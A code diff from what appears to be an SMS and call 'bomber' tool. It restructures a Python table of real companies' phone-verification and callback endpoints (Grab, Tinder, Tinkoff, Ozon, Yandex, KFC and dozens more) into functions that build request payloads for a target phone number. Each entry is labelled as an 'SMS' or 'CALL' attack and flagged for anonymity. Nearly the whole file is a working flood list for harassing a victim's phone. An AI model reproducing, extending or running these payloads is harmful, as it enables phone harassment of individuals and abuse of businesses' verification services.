@@ -1,364 +1,322 @@
-SMS_FLOODS = {
-    'https://p.grabtaxi.com/api/passenger/v2/profiles/register':
-    {
-        'method': 'post',
-        'success_text': '[+] Grab отправлено! || Кол-во -',
-        'attributes':
-        {
-            'data': {'phoneNumber': '{_phone}', 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
-                     'deviceToken': '*'},
-            'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}
-        }
-    },
+from Core.Attack.Tools.User_Agent import user_agent
 
-    'https://api.pizza-prosto.ru/P_login_sms':
-    {
-        'method': 'post',
-        'success_text': '[+] PizzaProsto отправлено || Кол-во - ',
-        'attributes': 
-        {
-            'data': {'phone': '{_phone9}'}
-        }
-    },
-    'https://moscow.rutaxi.ru/ajax_keycode.html':
-    {
-        'method': 'post',
-        'success_text': '[+] RuTaxi отправлено! || Кол-во - ',
-        'attributes':
-        {
-            'data': {'l': '{_phone9}'}
-        }
-    },
-    'https://belkacar.ru/get-confirmation-code':
-    {
-        'method': 'post',
-        'success_text': '[+] BelkaCar отправлено! || Кол-во -',
-        'attributes':
-        {
-            'data': {'aj': '50', 'registration-phone': '{_phone}'}
-        }
-    },
-    'https://starpizzacafe.com/mods/a.function.php':
-    {
-        'method': 'post',
-        'success_text': '[+] StarPizzaCafe отправлено! || Кол-во - ',
-        'attributes':
-        {
-            'data': {'aj': '50', 'registration-phone': '{_phone}'}
-        }
-    },
-    'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru':
-    {
-        'method': 'post',
-        'success_text': '[+] Tinder отправлено! || Кол-во - ',
-        'attributes':
-        {
-            'data': {'phone_number': '{_phone}'},
-            'headers': {}
-        }
-    },
-    'https://app.karusel.ru/api/v1/phone/':
-    {
-        'method': 'post',
-        'success_text': '[+] Karusel отправлено! || Кол-во - ',
-        'attributes':
-        {
-            'data': {'phone': '{_phone}'},
-            'headers': {}
-        }
-    },
-    'https://api.tinkoff.ru/v1/sign_up':
-    {
-        'method': 'post',
-        'success_text': '[+] Tinkoff отправлено! || Кол-во - ',
-        'attributes':
-        {
-            'data': {'phone': '+' + '{_phone}'},
-            'headers': {}
-        }
 
-    },
-    'https://dostavista.ru/backend/send-verification-sms':
-    {
-        'method': 'post',
-        'success_text': '[+] Dostavista отправлено! || Кол-во - ',
-        'attributes':
+def sms_urls(number):
+    return [
         {
-            'data': {"phone": '{_phone}'}
-        }
-    },
-    'https://www.monobank.com.ua/api/mobapplink/send':
-    {
-        'method': 'post',
-        'success_text': '[+] MonoBank отправлено! || Кол-во - ',
-        'attributes':
+            'info': {'country': 'ID', 'attack': 'SMS', 'website': 'Grab.com', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
+            'headers': {'User-Agent': user_agent()[0]},
+            'data': {'phoneNumber': number, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'},
+        },
         {
-            'data': {"phone": "+" + '{_phone}'}
-        }
-    },
-    'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32':
-    {
-        'method': 'get',
-        'success_text': '[+] SportMaster отправлено! || Кол-во - ',
-        'attributes':
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PizzaProsto.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://api.pizza-prosto.ru/P_login_sms',
+            'data': {'phone': number},
+        },
         {
-            'data': {"phone": '{_phone}'}
-        }
-    },
-    'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "+"+"{_phone}"},
-        }
-    },
-    'https://requests.service.banki.ru/form/960/submit': {
-        'method': 'get',
-        'attributes': {
-            "params": {"callback": "submitCallback", "name": "{_name}", "phone": "+"+"{_phone}", "email": "{_email}", "gorod": "Москва", "approving_": "1", },
-        }
-    },
-    'https://api.ivi.ru/mobileapi/user/register/phone/v6': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/': {
-        'method': 'post',
-        'attributes': {
-            "data": {"RECALL": "Y", "BACK_CALL_PHONE": "{_phone}"},
-        }
-    },
-    'https://city24.ua/personalaccount/account/registration': {
-        'method': 'post',
-        'attributes': {
-            "data": {"PhoneNumber": "{_phone}"},
-        }
-    },
-    'https://koronapay.com/transfers/online/api/users/otps': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://thehive.pro/auth/signup': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "+"+"{_phone}", },
-        }
-    },
-    'https://win.1admiralxxx.ru/api/en/register.json': {
-        'method': 'post',
-        'attributes': {
-            "json": {"mobile": "{_phone}", "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1, "email": "", "lang": "en", },
-        }
-    },
-    'https://cabinet.planetakino.ua/service/sms': {
-        'method': 'post',
-        'attributes': {
-            "params": {"phone": "{_phone}"},
-        }
-    },
-    'https://eda.yandex/api/v1/user/request_authentication_code': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone_number": "+"+"{_phone}"},
-        }
-    },
-    'https://uklon.com.ua/api/v1/account/code/send': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}"},
-            "headers": {"client_id": "6289de851fc726f887af8d5d7a56c635"},
-        }
-    },
-    'https://www.finam.ru/api/smslocker/sendcode': {
-        'method': 'get',
-        'attributes': {
-            "data": {"phone": "+"+"{_phone}"},
-        }
-    },
-    'https://client-api.sushi-master.ru/api/v1/auth/init': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}"},
-        }
-    },
-    'https://auth.multiplex.ua/login': {
-        'method': 'post',
-        'attributes': {
-            "json": {"login": "{_phone}"},
-        }
-    },
-    'https://ube.pmsm.org.ru/esb/iqos-phone/validate': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}"},
-        }
-    },
-    'https://api.kinoland.com.ua/api/v1/service/send-sms': {
-        'method': 'post',
-        'attributes': {
-            "json": {"Phone": "{_phone}", "Type": 1},
-            "headers": {"Agent": "website"},
-        }
-    },
-    'https://alfalife.cc/auth.php': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://kasta.ua/api/v2/login/': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://shop.vsk.ru/ajax/auth/postSms/': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://widgets.binotel.com/getcall/call/': {
-        'method': 'post',
-        'attributes': {
-        }
-    },
-    'https://passport.twitch.tv/register?trusted_request=true': {
-        'method': 'post',
-        'attributes': {
-            "json": {"birthday": {"day": 11, "month": 11, "year": 1999}, "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True, "password": 'password', "phone_number": "{_phone}", "username": 'username'},
-        }
-    },
-    'https://helsi.me/api/healthy/accounts/login': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}", "platform": "PISWeb"},
-        }
-    },
-    'https://btfair.site/api/user/phone/code': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "+"+"{_phone}", },
-        }
-    },
-    'https://smart.space/api/users/request_confirmation_code/': {
-        'method': 'post',
-        'attributes': {
-            "json": {"mobile": "+"+"{_phone}", "action": "confirm_mobile"},
-        }
-    },
-    'https://www.delivery-club.ru/ajax/user_otp': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code': {
-        'method': 'post',
-        'attributes': {
-            "params": {"msisdn": "{_phone}"},
-        }
-    },
-    'https://www.moyo.ua/identity/registration': {
-        'method': 'post',
-        'attributes': {
-            "data": {"firstname": "{_name}", "phone": "{_phone}", "email": "{_email}"},
-        }
-    },
-    'https://account.my.games/signup_send_sms/': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "{_phone}"},
-        }
-    },
-    'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}", "otpId": 0},
-        }
-    },
-    'https://ggbet.ru/api/auth/register-with-phone': {
-        'method': 'post',
-        'attributes': {
-            "data": {"phone": "+"+"{_phone}", "login": "{_email}", "password": 'password', "agreement": "on", "oferta": "on", },
-        }
-    },
-    'https://fix-price.ru/ajax/register_phone_code.php': {
-        'method': 'post',
-        'attributes': {
-            "data": {"register_call": "Y", "action": "getCode", "phone": "+"+"{_phone}"},
-        }
-    },
-    'https://api.chef.yandex/api/v2/auth/sms': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}"},
-        }
-    },
-    'https://www.niyama.ru/ajax/sendSMS.php': {
-        'method': 'post',
-        'attributes': {
-            "data": {"REGISTER[PERSONAL_PHONE]": "{_phone}", "code": "", "sendsms": "", },
-        }
-    },
-    'https://api.easypay.ua/api/auth/register': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}", "password": "{_password}"},
-        }
-    },
-    'https://secure.online.ua/ajax/check_phone/': {
-        'method': 'post',
-        'attributes': {
-            "params": {"reg_phone}": "{_phone}"},
-        }
-    },
-    'https://plink.tech/register/': {
-        'method': 'post',
-        'attributes': {
-            "json": {"phone": "{_phone}"},
-        }
-    },
-    'https://msk.tele2.ru/api/validation/number/': {
-        'method': 'post',
-        'attributes': {
-            "json": {"sender": "Tele2"},
-        }
-    },
-}
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'RuTaxi.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://moscow.rutaxi.ru/ajax_keycode.html',
+            'data': {'l': number},
+        },
+        {
+            'info': {'country': 'BY', 'attack': 'SMS', 'website': 'BelkaCar.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://belkacar.ru/get-confirmation-code',
+            'data': {'aj': '50', 'registration-phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'StarPizzaCafe.com', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://starpizzacafe.com/mods/a.function.php',
+            'data': {'aj': '50', 'registration-phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Tinder.com', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
+            'headers': {},
+            'data': {'phone_number': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Karusel.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://app.karusel.ru/api/v1/phone/',
+            'headers': {},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tinkoff.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.tinkoff.ru/v1/sign_up',
+            'headers': {},
+            'data': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Dostavista.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://dostavista.ru/backend/send-verification-sms',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'MonoBank.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.monobank.com.ua/api/mobapplink/send',
+            'data': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'SportMaster.ua', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'KFC.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
+            'json': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Banki.ru', 'anonymous': 'Yes'},
+            'method': 'get',
+            'url': 'https://requests.service.banki.ru/form/960/submit',
+            'params': {'callback': 'submitCallback', 'name': 'test', 'phone': '+' + number, 'email': 'test@test.com', 'gorod': 'Москва', 'approving_': '1'},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'IVI.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Taxi-Ritm.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
+            'data': {'RECALL': 'Y', 'BACK_CALL_PHONE': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'City24.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://city24.ua/personalaccount/account/registration',
+            'data': {'PhoneNumber': number},
+        },
+        {
+            'info': {'country': 'KZ', 'attack': 'SMS', 'website': 'KoronaPay.com', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://koronapay.com/transfers/online/api/users/otps',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'TheHive.pro', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://thehive.pro/auth/signup',
+            'json': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Admiral.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://win.1admiralxxx.ru/api/en/register.json',
+            'json': {'mobile': number, 'bonus': 'signup', 'agreement': 1, 'currency': 'RUB', 'submit': 1, 'email': '', 'lang': 'en'},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'PlanetaKino.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://cabinet.planetakino.ua/service/sms',
+            'params': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Yandex.Eda', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://eda.yandex/api/v1/user/request_authentication_code',
+            'json': {'phone_number': '+' + number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Uklon.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://uklon.com.ua/api/v1/account/code/send',
+            'json': {'phone': number},
+            'headers': {'client_id': '6289de851fc726f887af8d5d7a56c635'},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Finam.ru', 'anonymous': 'Yes'},
+            'method': 'get',
+            'url': 'https://www.finam.ru/api/smslocker/sendcode',
+            'data': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SushiMaster.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://client-api.sushi-master.ru/api/v1/auth/init',
+            'json': {'phone': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Multiplex.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://auth.multiplex.ua/login',
+            'json': {'login': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'IQOS.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ube.pmsm.org.ru/esb/iqos-phone/validate',
+            'json': {'phone': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'KinoLand.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
+            'json': {'Phone': number, 'Type': 1},
+            'headers': {'Agent': 'website'},
+        },
+        {
+            'info': {'country': 'KZ', 'attack': 'SMS', 'website': 'AlfalIFE.cc', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://alfalife.cc/auth.php',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Kasta.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://kasta.ua/api/v2/login/',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'VSK.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://shop.vsk.ru/ajax/auth/postSms/',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Binotel.com', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://widgets.binotel.com/getcall/call/',
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Twitch.tv', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://passport.twitch.tv/register?trusted_request=true',
+            'json': {'birthday': {'day': 11, 'month': 11, 'year': 1999}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': 'password', 'phone_number': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Helsi.me', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://helsi.me/api/healthy/accounts/login',
+            'json': {'phone': number, 'platform': 'PISWeb'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'BTFair.site', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://btfair.site/api/user/phone/code',
+            'json': {'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SmartSpace.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://smart.space/api/users/request_confirmation_code/',
+            'json': {'mobile': '+' + number, 'action': 'confirm_mobile'},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'DeliveryClub.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://www.delivery-club.ru/ajax/user_otp',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MTS.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+            'params': {'msisdn': number},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Moyo.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://www.moyo.ua/identity/registration',
+            'data': {'firstname': 'test', 'phone': number, 'email': 'test@test.com'},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MyGames.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://account.my.games/signup_send_sms/',
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ozon.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
+            'json': {'phone': number, 'otpId': 0},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'GGBet.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ggbet.ru/api/auth/register-with-phone',
+            'data': {'phone': '+' + number, 'login': 'test@test.com', 'password': 'password', 'agreement': 'on', 'oferta': 'on'},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'FixPrice.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://fix-price.ru/ajax/register_phone_code.php',
+            'data': {'register_call': 'Y', 'action': 'getCode', 'phone': '+' + number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Yandex.Chef', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.chef.yandex/api/v2/auth/sms',
+            'json': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Niyama.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://www.niyama.ru/ajax/sendSMS.php',
+            'data': {'REGISTER[PERSONAL_PHONE]': number, 'code': '', 'sendsms': ''},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'EasyPay.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://api.easypay.ua/api/auth/register',
+            'json': {'phone': number, 'password': 'password123'},
+        },
+        {
+            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Secure.Online.ua', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://secure.online.ua/ajax/check_phone/',
+            'params': {'reg_phone}': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Plink.tech', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://plink.tech/register/',
+            'json': {'phone': number},
+        },
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tele2.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://msk.tele2.ru/api/validation/number/',
+            'json': {'sender': 'Tele2'},
+        },
+    ]
 
-CALL_FLOODS = {
-    'https://my.zadarma.com/connect/':
-    {
-        'method': 'post',
-        'success_text': '[+] zadarma звонок отправлен!',
-        'failure_text': '[-] Не удалось отправить запрос на звонок! (zadarma) ',
-        'attributes':
+
+def call_urls(number):
+    return [
         {
-            'params': {"?number=": '+' + '{_phone}'}
-        }
-    },
-    'https://findclone.ru/register':
-    {
-        'method': 'get',
-        'success_text': '[+] findclone звонок отправлен!',
-        'failure_text': '[-] Не удалось отправить запрос на звонок! (findclone)',
-        'attributes':
+            'info': {'country': 'ALL', 'attack': 'CALL', 'website': 'Zadarma.com', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://my.zadarma.com/connect/',
+            'params': {'?number=': '+' + number},
+        },
         {
-            'params': {'phone': '+' + '{_phone}'}
-        }
-    },
-    'https://msk.dostaevsky.ru/ajax/feedback/':
-    {
-        'method': 'post',
-        'success_text': '[+] dostaevsky звонок отправлен!',
-        'failure_text': '[-] Не удалось отправить запрос на звонок! (dostaevsky)',
-        'attributes':
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'FindClone.ru', 'anonymous': 'Yes'},
+            'method': 'get',
+            'url': 'https://findclone.ru/register',
+            'params': {'phone': '+' + number},
+        },
         {
-            'params': {"back_call": '+' + '{_phone}'}
-        }
-    }
-}
+            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Dostaevsky.ru', 'anonymous': 'Yes'},
+            'method': 'post',
+            'url': 'https://msk.dostaevsky.ru/ajax/feedback/',
+            'params': {'back_call': '+' + number},
+        },
+    ]
